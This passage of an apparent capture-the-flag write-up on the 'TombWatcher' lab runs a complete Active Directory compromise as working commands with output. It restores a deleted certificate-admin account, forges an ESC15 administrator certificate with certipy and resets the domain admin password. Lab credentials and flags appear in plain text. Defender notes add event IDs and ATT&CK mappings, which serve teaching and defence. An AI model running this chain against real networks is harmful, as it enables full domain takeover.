Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\john\Documents> type C:\Users\john\Desktop\user.txt  
b3dbedf0c22520de8afb0afe5ea294e7
```

And we got the user flag.

We see on Bloodhound that `john` has `GenericAll` on the `ADCS Organizational Unit`.

We'll search for deleted objects with `bloodyad` and `-c 1.2.840.113556.1.4.417`

```bash
>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'john' -p 'Scrow123&' get search --filter '(&(isDeleted=TRUE)(objectClass=user))' --attr 'sAMAccountName,distinguishedName,lastKnownParent'  
-c 1.2.840.113556.1.4.417  
  
  
distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb  
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb  
sAMAccountName: cert_admin  
  
distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb  
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb  
sAMAccountName: cert_admin  
  
distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb  
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb  
sAMAccountName: cert_admin
```

We'll restore one of them since they appear identical and have a `sAMAccountName: cert_admin` which might indicate they are a `Certificate Administrator` which has high value for us since it could manage `Active Directory Certificate Services (ADCS)` :

```PowerShell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter * -IncludeDeletedObjects -Properties sAMAccountName,objectSid,objectGUID |  
 Where-Object { $_.objectSid -eq 'S-1-5-21-1392491010-1358638721-2126982587-1111' } |  
 Format-List sAMAccountName,objectSid,objectGUID,distinguishedName  
  
  
sAMAccountName    : cert_admin  
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111  
objectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf  
distinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb  
  
  
  
*Evil-WinRM* PS C:\Users\john\Documents> Remove-ADUser -Identity 'cert_admin' -Confirm:$false  
   
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf' -TargetPath 'OU=ADCS,DC=tombwatcher,DC=htb'  
   
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount cert_admin  
Unlock-ADAccount cert_admin -ErrorAction SilentlyContinue  
Set-ADAccountPassword cert_admin -Reset -NewPassword (ConvertTo-SecureString 'Scrow123&' -AsPlainText -Force)  
Get-ADUser cert_admin -Properties SID,Enabled | Format-List Name,SID,Enabled  
  
  
Name    : cert_admin  
SID     : S-1-5-21-1392491010-1358638721-2126982587-1111  
Enabled : True
```

We got the `cert_admin` with the `SID` ending in `-1111` which is the only one that's authorized on the `DACL` for the template we'll use.
We deleted the live `cert_admin` with SID ending in `-1109` because it didn't match the principal needed for certipy.

**Blue** : `Account restored from deletion` from a non-admin account : `john`
`IDs = 5136 DC object change; 4662 operation on object; 4724 change password`
The severity becomes critical and active Security Engineers will try to stop it at all costs if they catch it immediately because `john` is at the end-tail of the `ACL-abuse-chain` and `Full Domain Compromise` is very close when looking at the chain : a highly priviledged account, `cert_admin` was just acquired by the attacker.

MITRE ATT&CK ID : T1098 Account Manipulation / T1136 Create Account (debatable ; since the account was `re-created` and not `created-as-new`, T1098 is more accurate)

We'll use `certipy` to find templates and vulnerabilities :

```bash
>  certipy find -u 'cert_admin@tombwatcher.htb' -p 'Scrow123&' -dc-ip 10.129.41.160 -enabled -stdout 2>&1 | tee certipy.txt
```

We found the `WebServer Template` :

```bash
216:    Template Name                       : WebServer  
220:    Client Authentication               : False  
223:    Enrollee Supplies Subject           : True  
224:    Certificate Name Flag               : EnrolleeSuppliesSubject  
229:    Schema Version                      : 1  
237:        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins  
256:    Client Authentication               : True  
259:    Enrollee Supplies Subject           : False
```

```bash
>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'john' -p 'Scrow123&' get object 'cert_admin' --attr 'objectSid'  
  
  
distinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb  
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1111  
>  certipy req -u 'cert_admin@tombwatcher.htb' -p 'Scrow123&' -dc-ip 10.129.41.160 -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-p  
olicies '1.3.6.1.5.5.7.3.2'  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 5  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator@tombwatcher.htb'  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'
```

MITRE ATT&CK ID : T1649 Steal or Forge Authentication Certificates

We fix `SSL` with `python` and with our ESC15 cert as `Administrator` we use `Schannel` and proceed to get a shell :

```
   
>  >....                                                                                                                                                                                                             
ssl.SSLContext.load_cert_chain = load_cert_chain  
  
sys.argv = [  
   'certipy', 'auth',  
   '-pfx', '/home/vagabond/tmp/Tombwatcher/administrator.pfx',  
   '-dc-ip', '10.129.41.160',  
   '-ldap-shell',  
]  
sys.path.insert(0, '/usr/share/certipy')  
from certipy.entry import main  
main()  
EOF  
  
/usr/share/certipy/venv/bin/python ~/tmp/Tombwatcher/certipy_schannel.py  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: 'administrator@tombwatcher.htb'  
[*] Connecting to 'ldaps://10.129.41.160:636'  
[*] Authenticated to '10.129.41.160' as: 'u:TOMBWATCHER\\Administrator'  
Type help for list of commands  
  
# whoami  
u:TOMBWATCHER\Administrator  
  
# change_password administrator "ScrowPurple1&"  
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb  
Attempting to set new password of: ScrowPurple1&  
Password changed successfully!  
  
# exit  
Bye!
```

MITRE ATT&CK ID : T1078 Valid Accounts & T1098 Account Manipulation

```bash
>  nxc winrm tombwatcher.htb -u administrator -p 'ScrowPurple1&'  
WINRM       10.129.41.160   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)    
WINRM       10.129.41.160   5985   DC01             [+] tombwatcher.htb\administrator:ScrowPurple1& (Pwn3d!)
```

And we have compromised the domain.

We grab the root flag and un-skew our clock :

```bash
>  evil-winrm -i DC01.tombwatcher.htb -u Administrator -p 'ScrowPurple1&'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt  
bbd3059994e750e1a83e7db873be3403  
*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo  
  
Host Name:                 DC01  
OS Name:                   Microsoft Windows Server 2019 Standard  
OS Version:                10.0.17763 N/A Build 17763  
OS Manufacturer:           Microsoft Corporation  
OS Configuration:          Primary Domain Controller  
OS Build Type:             Multiprocessor Free  
Registered Owner:          Windows User  
Registered Organization:  
Product ID:                00429-00521-62775-AA332  
Original Install Date:     11/15/2024, 6:52:36 PM  
System Boot Time:          7/17/2026, 7:16:05 PM  
System Manufacturer:       VMware, Inc.  
System Model:              VMware7,1  
System Type:               x64-based PC  
Processor(s):              2 Processor(s) Installed.  
                          [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz  
                          [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz  
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025  
Windows Directory:         C:\Windows  
System Directory:          C:\Windows\system32  
Boot Device:               \Device\HarddiskVolume2  
System Locale:             en-us;English (United States)  
Input Locale:              en-us;English (United States)  
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)  
Total Physical Memory:     4,095 MB  
Available Physical Memory: 3,022 MB  
Virtual Memory: Max Size:  4,799 MB  
Virtual Memory: Available: 3,709 MB  
Virtual Memory: In Use:    1,090 MB  
Page File Location(s):     C:\pagefile.sys  
Domain:                    tombwatcher.htb  
Logon Server:              N/A  
Hotfix(s):                 N/A  
Network Card(s):           1 NIC(s) Installed.  
                          [01]: vmxnet3 Ethernet Adapter  
                                Connection Name: Ethernet0 2  
                                DHCP Enabled:    Yes  
                                DHCP Server:     10.10.10.2  
                                IP address(es)  
                                [01]: 10.129.41.160  
                                [02]: fe80::7327:ba46:86b5:29f3  
                                [03]: dead:beef::2db1:7f5e:559e:3ea0  
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```bash
>  sudo timedatectl set-ntp true  
sudo systemctl restart systemd-timesyncd
```